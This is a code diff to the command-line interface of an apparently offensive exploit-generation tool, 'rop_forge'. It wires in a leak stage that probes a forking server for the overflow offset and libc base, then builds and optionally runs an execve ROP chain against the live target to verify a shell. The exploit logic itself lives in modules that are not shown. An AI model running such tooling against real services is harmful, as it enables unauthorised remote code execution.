@@ -8,9 +8,13 @@ from rop_forge.chainer import (
     Chain,
     ChainNotFoundError,
     build_execve_chain,
+    build_leaked_execve_chain,
+    find_system_libc,
+    verify_leaked_shell,
     verify_shell,
 )
 from rop_forge.gadgets import GadgetDatabase, GadgetKind, scan_gadgets
+from rop_forge.leak import ForkingServer, LeakError, probe
 from rop_forge.offset import OffsetNotFoundError, find_offset
 
 _EXAMPLES_PER_KIND = 5
@@ -27,6 +31,19 @@ def build_parser() -> argparse.ArgumentParser:
     parser.add_argument("--libc", help="path to the target's libc, if known", default=None)
     parser.add_argument(
         "--run", action="store_true", help="execute the generated exploit against the live target"
+    )
+    parser.add_argument(
+        "--server",
+        default=None,
+        help=(
+            "path to a forking-server variant of the target (see "
+            "fixtures/src/server_main.c) — for PIE/ASLR targets, switches "
+            "--stage chainer to the leak-based flow: probes this server for "
+            "the overflow offset and libc's real runtime base, then builds/"
+            "verifies the chain against it, instead of the aslr=False "
+            "stand-in build_execve_chain() uses. (--stage leak always takes "
+            "a server binary directly as its positional `binary` argument.)"
+        ),
     )
     parser.add_argument(
         "--stage",
@@ -82,7 +99,29 @@ def _print_chain(chain: Chain) -> None:
     print(chain)
 
 
+def _resolve_libc(args: argparse.Namespace) -> str:
+    libc_path = args.libc or find_system_libc()
+    if libc_path is None:
+        raise ChainNotFoundError("no libc available and none found at standard system paths")
+    return str(libc_path)
+
+
 def _run_chainer(args: argparse.Namespace) -> int:
+    if args.server:
+        with ForkingServer(args.server) as server:
+            chain, offset = build_leaked_execve_chain(server, _resolve_libc(args))
+            _print_chain(chain)
+            if args.run:
+                ok = verify_leaked_shell(server, chain, offset)
+                print()
+                print(
+                    "Shell verified — got real command execution"
+                    if ok
+                    else "Shell verification failed"
+                )
+                return 0 if ok else 4
+        return 0
+
     chain = build_execve_chain(args.binary, libc_path=args.libc)
     _print_chain(chain)
     if args.run:
@@ -91,6 +130,14 @@ def _run_chainer(args: argparse.Namespace) -> int:
         print()
         print("Shell verified — got real command execution" if ok else "Shell verification failed")
         return 0 if ok else 4
+    return 0
+
+
+def _run_leak(args: argparse.Namespace) -> int:
+    with ForkingServer(args.binary) as server:
+        result = probe(server, _resolve_libc(args))
+    print(f"Offset to return address: {result.offset} bytes")
+    print(f"Libc runtime base: 0x{result.libc_base:x}")
     return 0
 
 
@@ -107,7 +154,7 @@ STAGE_RUNNERS = {
     "gadgets": _run_gadgets,
     "offset": _run_offset,
     "chainer": _run_chainer,
-    "leak": _stage_not_yet_implemented("leak"),
+    "leak": _run_leak,
     "exploit": _stage_not_yet_implemented("exploit"),
 }
 
@@ -135,6 +182,9 @@ def main(argv: list[str] | None = None) -> int:
         print(f"rop-forge: {exc}", file=sys.stderr)
         return 3
     except ChainNotFoundError as exc:
+        print(f"rop-forge: {exc}", file=sys.stderr)
+        return 3
+    except LeakError as exc:
         print(f"rop-forge: {exc}", file=sys.stderr)
         return 3
 
